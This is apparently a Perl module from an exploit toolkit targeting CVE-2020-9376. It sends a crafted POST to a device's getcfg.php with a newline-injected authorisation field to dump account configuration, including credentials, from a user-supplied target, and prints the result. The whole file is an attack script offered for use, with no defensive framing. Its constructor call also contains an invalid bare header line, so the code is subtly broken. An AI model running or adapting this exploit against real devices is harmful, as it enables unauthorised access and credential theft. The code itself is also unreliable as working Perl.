package Spellbook::Exploit::CVE_2020_9376 {
    use strict;
    use warnings;
    use Mojo::UserAgent;

    sub new {
        my $target = $ARGV[0];
        my $port   = $ARGV[1];

        if (($target) && ($port)) {
            my $endpoint = "http://$target:$port/getcfg.php";
            my $payload  = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
            
            my $ua  = Mojo::UserAgent -> new(
                Content-Type: application/x-www-form-urlencoded
            );
            my $request = $ua -> post ($endpoint => $payload) -> result();
            my $response = $request -> body();
            
            print $response;
        }

        return 0;
    }
}

1;